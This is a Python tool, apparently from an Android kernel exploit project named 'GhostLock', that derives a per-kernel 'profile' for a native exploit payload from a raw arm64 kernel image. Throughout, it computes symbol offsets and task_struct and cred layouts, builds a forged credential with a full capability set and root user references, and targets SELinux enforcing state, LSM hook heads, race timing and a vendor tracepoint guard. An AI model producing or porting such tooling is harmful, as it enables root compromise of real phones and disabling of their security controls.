#!/usr/bin/env python3
"""Derive a GhostLock kernel profile (.conf) from a raw arm64 kernel Image.

Pipeline: kernel Image -> kallsyms (kernel_syms) + BTF (kernel_btf) -> the
offset / task_struct / cred / route sections the native payload consumes.

    python tools/port/derive_profile.py artifacts/5.15.137/kernel.bin \
        -o build/t1/profile.conf --workdir build/t1 --waiter-off 80

    # acceptance gate: every kernel-derived field must match the native
    # extractor's golden sample bit for bit
    python tools/port/derive_profile.py artifacts/5.15.137/kernel.bin \
        -o build/t1/profile.conf --waiter-off 80 \
        --diff artifacts/5.15.137/extractor-conf.conf --skip vr_guard mcast

Fields that cannot come out of the image (execution tuning, mcast arming, the
vivo vr_guard gate) are inherited from the field-tested Neo9 5.15.197 profile
and marked as such in the generated comments.
"""
import argparse
import json
import os
import re
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import kernel_btf
import unpack_boot

SIGN64 = 1 << 64

# Capability set written into the forged cred (CAP_LAST_CAP+1 bits set).
CAP_FULL_SET = (1 << 41) - 1
# kmalloc size classes; mm_struct_sz is the slab bucket, not sizeof().
SLAB_CLASSES = [8, 16, 32, 64, 96, 128, 192, 256, 512, 1024, 2048, 4096]

# Advisory tuning inherited verbatim from the shipped (field-tested) Neo9
# 5.15.197 profile. These are race budgeting knobs, identical for every kernel.
EXEC_DEFAULTS = {
    'recommended_cpus': {'main': 0, 'consumer': 1},
    'heap': {'prepare_max_attempts': 4, 'prepare_timeout_ms': 240000,
             'kernelsnitch_timeout_ms': 60000},
    'race': {'route_wait_ms': 1000, 'route_done_timeout_ms': 300000,
             'setup_settle_us': 50000, 'state_poll_interval_us': 1000},
    'stages': {'w1_attempts': 15, 'w1_settle_us': 100000,
               'w1_scratch_repair_attempts': 3, 'w2_attempts': 15,
               'w2_settle_us': 100000, 'w3_chain_rounds': 3,
               'w3_attempts': 6, 'w3_settle_us': 50000},
    'handoff': {'pre_dispatch_settle_ms': 2000, 'module_poll_attempts': 30,
                'module_poll_interval_ms': 100, 'enforce_poll_attempts': 200,
                'enforce_poll_interval_ms': 100},
    'selected_cpus': {'main': 3, 'consumer': 4},
    'routes.select_stack': {'consumer_max_calls': 1, 'consumer_burst_calls': 1},
}


def slab_class(size):
    for c in SLAB_CLASSES:
        if size <= c:
            return c
    return ((size + 4095) // 4096) * 4096


def signed64(v):
    v &= SIGN64 - 1
    return v - SIGN64 if v >= (1 << 63) else v


class Elf:
    """Minimal VA -> bytes reader over the recovered vmlinux ELF."""

    def __init__(self, path):
        from elftools.elf.elffile import ELFFile
        self.fh = open(path, 'rb')
        self.elf = ELFFile(self.fh)
        self.sections = [(s['sh_addr'], s['sh_addr'] + s['sh_size'], s)
                         for s in self.elf.iter_sections()
                         if s['sh_type'] == 'SHT_PROGBITS' and s['sh_size']]

    def read(self, va, n):
        for lo, hi, sec in self.sections:
            if lo <= va < hi:
                data = sec.data()
                off = va - lo
                return data[off:off + n]
        return None


def sh(cmd):
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        raise SystemExit(f'{" ".join(cmd)} failed:\n{r.stdout}\n{r.stderr}')
    return r.stdout


def ensure_symbols(kernel_path, workdir):
    js = os.path.join(workdir, 'symbols.json')
    elf = os.path.join(workdir, 'vmlinux.elf')
    if not (os.path.exists(js) and os.path.exists(elf)):
        sh([sys.executable, os.path.join(HERE, 'kernel_syms.py'),
            kernel_path, '-o', workdir])
    with open(js, encoding='utf-8') as f:
        return json.load(f), elf


def ensure_btf(kernel, workdir):
    btf_path = os.path.join(workdir, 'kernel.btf')
    if not os.path.exists(btf_path):
        found = kernel_btf.find_btf(kernel)
        if not found:
            raise SystemExit('no embedded BTF; cannot derive struct offsets')
        with open(btf_path, 'wb') as f:
            f.write(kernel[found[0]:found[0] + found[1]])
    return kernel_btf.BTF(open(btf_path, 'rb').read())


def derive_route(sym_offsets):
    """Mirror the native route decision for 5.x/6.x kernels."""
    if 'ip_mc_source' in sym_offsets:
        return 'multicast_waiter', 'ip_mc_source present (5.x family)'
    if 'core_sys_select' in sym_offsets and 'futex_wait' in sym_offsets:
        return 'select_stack', 'core_sys_select + futex_wait present'
    if 'tcp_zerocopy_receive' in sym_offsets:
        return 'tcp_zerocopy', 'tcp_zerocopy_receive present'
    raise SystemExit('no usable route in this kernel')


def load_extractor_fields(conf_path):
    """Read fields the native extractor produced but that are not image-derivable.

    Only `route.*.waiter_off` is architected this way today: the native tool
    derives it from the setsockopt/futex stack-depth delta, which needs a
    call-graph frame analysis this pipeline does not do.
    """
    out = {}
    if not conf_path:
        return out
    flat = parse_conf(open(conf_path, encoding='utf-8').read())
    for k, v in flat.items():
        if k.endswith('.waiter_off'):
            out['waiter_off'] = int(v, 0)
        elif k == 'offset.slide_loggers_0_1':
            out['slide_loggers_0_1'] = int(v, 0)
    return out


# `vr_sys_exit_tp` is the plain `__tracepoint_sys_exit` address. The native
# payload adds the `.funcs` field offset itself: on this device it logged
#   image=ffffffc082f0c708  (low bits 0x2f0c708 = tp_off 0x2f0c6c8 + 0x40)
# so a profile that pre-added 0x40 would make it write tp+0x80.
VR_MODES = {'tp': 0}


def derive_loggers_slot(addrs):
    """`slide_loggers_0_1` is `loggers + 8`.

    The array is empty in the image (netfilter loggers register at boot), so the
    populated index cannot be read out. The shipped Neo9 5.15.197 profile pins
    `loggers + 8` (0x2ce1fe0 with loggers at 0x2ce1fd8), i.e. the second entry;
    the native payload uses that plus nfulnl_logger as its two anchors. Keep the
    same convention so a generated profile stays layout-equivalent when the
    array moves.
    """
    loggers = addrs.get('loggers')
    if not loggers:
        return None, None
    slot = 1
    return slot, signed64(loggers + 8 * slot)


def build_conf(kernel, symbols, elf_path, waiter_off, phys_load, phys_offset,
               route_override, use_includes=False, vr_mode='tp', waiter_source='cli',
               loggers_off=None):
    addrs = symbols['addresses']
    offs = symbols['offsets']
    release = unpack_boot.kernel_release(kernel)
    if not release:
        raise SystemExit('no release string in the kernel image')
    major = int(release.split('.')[0])
    btf = ensure_btf(kernel, os.path.dirname(elf_path) or '.')
    structs = kernel_btf.dump_structs(btf)
    ts = structs['task_struct']
    cred = structs['cred']
    cred_refs = structs['cred_refs']
    waiter = structs['rt_mutex_waiter']
    sz = structs['sizes']

    route = route_override
    reason = 'forced by --route'
    if not route:
        route, reason = derive_route(offs)
        if major < 6 and route == 'tcp_zerocopy':
            route, reason = 'multicast_waiter', '5.x kernel prefers multicast'

    slot, _slot_off = derive_loggers_slot(addrs)

    cr = {
        'copy_size': sz['cred'],
        'usage_value': 256,
        'caps_offset': cred['cap_permitted'],
        'caps_count': 3,
        'caps_value': CAP_FULL_SET,
        'ref_count': 4,
        'ref0_offset': cred_refs['user'],
        'ref1_offset': cred_refs['user_ns'],
        'ref2_offset': cred_refs['ucounts'],
        'ref3_offset': cred_refs['group_info'],
        'ref0_image': signed64(addrs.get('ext_root_user') or addrs['root_user']),
        'ref1_image': signed64(addrs['init_user_ns']),
        'ref2_image': signed64(addrs['init_ucounts']),
        'ref3_image': signed64(addrs['init_groups']),
    }
    selinux_enforcing = offs.get('selinux_enforcing', offs.get('selinux_state'))

    L = []
    a = L.append
    a('# GhostLock kernel profile derived from the kernel image (tools/port).')
    a(f'# release     : {release}')
    a(f'# route reason: {reason}')
    a('# 派生规则：offset.* = 符号地址 - _text')
    a('#           task_struct / cred 结构偏移来自内嵌 BTF')
    a('#           cred.ref*_image = 全局对象地址的 i64 有符号值')
    a('#           execution / mcast / vr_guard 与内核无关，继承同机型已实测配置')
    a(f'release = "{release}"')
    a('schema_version = 1')
    a(f'kernel_major = {major}')
    a('recommend_shizuku = 0')
    a(f'kernel_phys_load = {phys_load if phys_load is not None else "null"}')
    a(f'kernel_phys_offset = {phys_offset if phys_offset is not None else "null"}')
    a('route {')
    a(f'  {route} {{')
    if route == 'multicast_waiter':
        a(f'    waiter_off = {waiter_off if waiter_off is not None else 0}'
          f'{"" if waiter_source == "cli" else "  # from " + waiter_source}')
        a('    buffer_size = 264')
        a(f'    task_offset = {waiter["task"]}')
        a(f'    lock_offset = {waiter["lock"]}')
        a('    compact_waiter = 1' if major < 6 else '    compact_waiter = 0')
    a('  }')
    a('}')
    a('fallback {')
    a('  to = "none"')
    a('}')
    a('kernelsnitch {')
    a('  collisions = 8')
    a(f'  mm_struct_sz = {slab_class(sz["mm_struct"])}')
    a('}')
    a('task_struct {')
    for k in kernel_btf.TASK_KEYS:
        a(f'  {k} = {ts[k]}')
    a('}')
    a('cred {')
    a('  usage_offset = null')
    for k in ('copy_size', 'usage_value', 'caps_offset', 'caps_count', 'caps_value',
              'ref_count', 'ref0_offset', 'ref1_offset', 'ref2_offset', 'ref3_offset',
              'ref0_image', 'ref1_image', 'ref2_image', 'ref3_image'):
        a(f'  {k} = {cr[k]}')
    a('}')
    a('offset {')
    a(f'  init_task = {offs["init_task"]}')
    a(f'  init_cred = {offs["init_cred"]}')
    a(f'  empty_zero_page = {offs["empty_zero_page"]}')
    a(f'  root_task_group = {offs["root_task_group"]}')
    a(f'  selinux_enforcing = {selinux_enforcing}')
    a(f'  selinux_blob_sizes = {offs["selinux_blob_sizes"]}')
    a(f'  security_hook_heads = {offs["security_hook_heads"]}')
    a(f'  slide_nfulnl_logger = {offs["nfulnl_logger"]}')
    loggers_0_1 = loggers_off if loggers_off is not None else (
        offs['loggers'] + slot * 8 if slot is not None else None)
    if loggers_0_1 is not None:
        suffix = '' if loggers_off is None else '  # from extractor'
        a(f'  slide_loggers_0_1 = {loggers_0_1}{suffix}')
    a(f'  slide_boot_id = {offs["sysctl_bootid"]}')
    vr_add = VR_MODES.get(vr_mode, 0)
    a(f'  # __tracepoint_sys_exit + {vr_add:#x}（vr_mode={vr_mode}；语义见 docs/PORT-NOTES.md）')
    a(f'  vr_sys_exit_tp = {offs["__tracepoint_sys_exit"] + vr_add}')
    a('}')
    a('mcast {')
    a('  attempts = 0')
    a('  arm_sequence = 0')
    a('  arm_hold = 0')
    a('}')
    a('# vivo：multicast 路由前必须中和 sys_exit 探针，否则 setsockopt 返回 EADDRNOTAVAIL')
    a('vr_guard {')
    a('  enabled = 1')
    a('  tracepoint_funcs = 64')
    a('}')
    if use_includes:
        a('# 调优段与内核无关；用仓库共享 preset（要求 conf 与 preset 同目录）')
        a('include "execution-tuning.conf"')
        a('include "execution-select-stack.conf"')
    else:
        e = EXEC_DEFAULTS
        blocks = [('recommended_cpus', e['recommended_cpus']),
                  ('heap', e['heap']),
                  ('race', e['race']),
                  ('stages', e['stages']),
                  ('handoff', e['handoff']),
                  ('selected_cpus', e['selected_cpus'])]
        a('execution {')
        for name, kv in blocks:
            a(f'  {name} {{')
            for k, v in kv.items():
                a(f'    {k} = {v}')
            a('  }')
        a('  routes {')
        a('    select_stack {')
        for k, v in e['routes.select_stack'].items():
            a(f'      {k} = {v}')
        a('    }')
        a('  }')
        a('}')
    return '\n'.join(L) + '\n', {'release': release, 'route': route, 'slot': slot,
                                  'structs': structs}


# ---------------------------------------------------------------- conf diff
LEAF_RE = re.compile(r'^\s*([A-Za-z_][\w.]*)\s*=\s*"?([^"#]*?)"?\s*(?:#.*)?$')
BLOCK_RE = re.compile(r'^\s*([A-Za-z_][\w]*)\s*\{\s*$')


def parse_conf(text):
    """Flatten a HOCON-lite GhostLock profile into dotted key -> scalar."""
    out, stack = {}, []
    for raw in text.splitlines():
        stripped = raw.strip()
        if not stripped or stripped.startswith('#'):
            continue
        body = raw.split('#', 1)[0].rstrip()
        if not body.strip():
            continue
        m = BLOCK_RE.match(body)
        if m:
            stack.append(m.group(1))
            continue
        if body.strip() == '}':
            if stack:
                stack.pop()
            continue
        m = LEAF_RE.match(body)
        if m:
            out['.'.join(stack + [m.group(1)])] = m.group(2).strip()
    return out


def diff_conf(actual_text, golden_text, skip=(), only=()):
    """Compare derived against golden; golden defines the reference key set.

    Returns (rows, extras) where rows covers every golden key and extras lists
    derived keys the golden sample does not carry (e.g. the tuning block, which
    the native extractor never emits).
    """
    got, want = parse_conf(actual_text), parse_conf(golden_text)

    def wanted(k):
        if any(k == s or k.startswith(s + '.') for s in skip):
            return False
        if only:
            return any(k == s or k.startswith(s + '.') for s in only)
        return True

    rows = [(k, got.get(k), want[k], got.get(k) == want[k])
            for k in sorted(want) if wanted(k)]
    extras = sorted(k for k in got if k not in want and wanted(k))
    return rows, extras


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument('kernel')
    ap.add_argument('-o', '--out', default='profile.conf')
    ap.add_argument('--workdir', default=None,
                    help='cache dir for symbols/elf/btf (default: next to --out)')
    ap.add_argument('--waiter-off', type=int, default=None,
                    help='multicast waiter offset inside the forged buffer')
    ap.add_argument('--route', default=None,
                    choices=['multicast_waiter', 'select_stack', 'tcp_zerocopy'])
    ap.add_argument('--phys-load', default=None, help='kernel_phys_load (hex or dec)')
    ap.add_argument('--phys-offset', default=None, help='kernel_phys_offset (hex or dec)')
    ap.add_argument('--diff', default=None, help='compare against a golden .conf')
    ap.add_argument('--skip', nargs='*', default=[],
                    help='key names/prefixes ignored by --diff')
    ap.add_argument('--only', nargs='*', default=[],
                    help='restrict --diff to these key names/prefixes')
    ap.add_argument('--from-extractor', default=None, metavar='CONF',
                    help='import fields the image cannot yield (waiter_off) from a '
                         'native ghostlock-extract output')
    ap.add_argument('--vr-sys-exit-mode', default='tp', choices=sorted(VR_MODES),
                    help='kept for compatibility; only tp is valid (the native '
                         'payload adds the .funcs field offset itself)')
    ap.add_argument('--includes', action='store_true',
                    help='emit include lines instead of inlining the tuning block')
    args = ap.parse_args(argv)

    kernel = open(args.kernel, 'rb').read()
    workdir = args.workdir or (os.path.dirname(os.path.abspath(args.out)) or '.')
    os.makedirs(workdir, exist_ok=True)
    symbols, elf_path = ensure_symbols(args.kernel, workdir)

    def num(v):
        return None if v is None else int(v, 0)

    waiter_off, waiter_source = args.waiter_off, 'cli'
    loggers_off = None
    imported = load_extractor_fields(args.from_extractor)
    if imported:
        if waiter_off is None and 'waiter_off' in imported:
            waiter_off, waiter_source = imported['waiter_off'], 'extractor'
        loggers_off = imported.get('slide_loggers_0_1')
    text, meta = build_conf(kernel, symbols, elf_path, waiter_off,
                            num(args.phys_load), num(args.phys_offset),
                            args.route, use_includes=args.includes,
                            vr_mode=args.vr_sys_exit_mode, waiter_source=waiter_source,
                            loggers_off=loggers_off)
    with open(args.out, 'w', encoding='utf-8', newline='\n') as f:
        f.write(text)
    print(json.dumps({'out': args.out, 'release': meta['release'],
                      'route': meta['route'], 'loggers_slot': meta['slot']},
                     ensure_ascii=False))

    if args.diff:
        golden = open(args.diff, encoding='utf-8').read()
        rows, extras = diff_conf(text, golden, skip=args.skip, only=args.only)
        bad = [r for r in rows if not r[3]]
        for k, g, w, _ok in bad:
            print(f'DIFF {k}: derived={g!r} golden={w!r}')
        for k in extras:
            print(f'EXTRA {k}: derived only (golden does not carry it)')
        print(f'{"OK" if not bad else "MISMATCH"}: '
              f'{len(rows) - len(bad)}/{len(rows)} golden fields match, '
              f'{len(extras)} derived-only')
        return 0 if not bad else 1
    return 0


if __name__ == '__main__':
    sys.exit(main())
